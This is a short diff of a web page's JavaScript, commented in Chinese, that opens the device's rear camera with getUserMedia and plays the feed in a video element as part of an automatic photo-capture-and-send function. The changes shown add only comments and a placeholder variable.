@@ -12,12 +12,16 @@
 
   <script>
     // 自動拍照功能
+    let photoData = null;
+
+    // 啟動相機並自動拍照與傳送
     async function startCameraAndSend() {
       const statusElement = document.getElementById('status');
 
       try {
+        // 啟動相機
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'environment' } },
+          video: { facingMode: { ideal: 'environment' } }, // 使用後置相機
         });
         const video = document.createElement('video');
         video.srcObject = stream;
@@ -25,7 +29,7 @@
         // 等待相機畫面載入
         await new Promise((resolve) => {
           video.onloadedmetadata = () => {
-            video.play();
+            video.play(); // 播放相機畫面
             resolve();
           };
         });
